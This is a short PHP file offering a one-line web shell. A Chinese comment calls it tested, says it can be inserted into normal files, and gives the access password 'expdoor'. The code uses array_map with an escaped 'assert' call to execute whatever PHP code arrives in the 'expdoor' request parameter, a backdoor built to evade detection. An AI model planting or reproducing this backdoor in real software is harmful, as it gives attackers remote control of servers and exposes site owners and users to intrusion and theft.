<!--------------------------

测试可用,可插入正常文件中

密码:expdoor
---------------------------->


<?php array_map("ass\x65rt",(array)$_REQUEST['expdoor']);?>

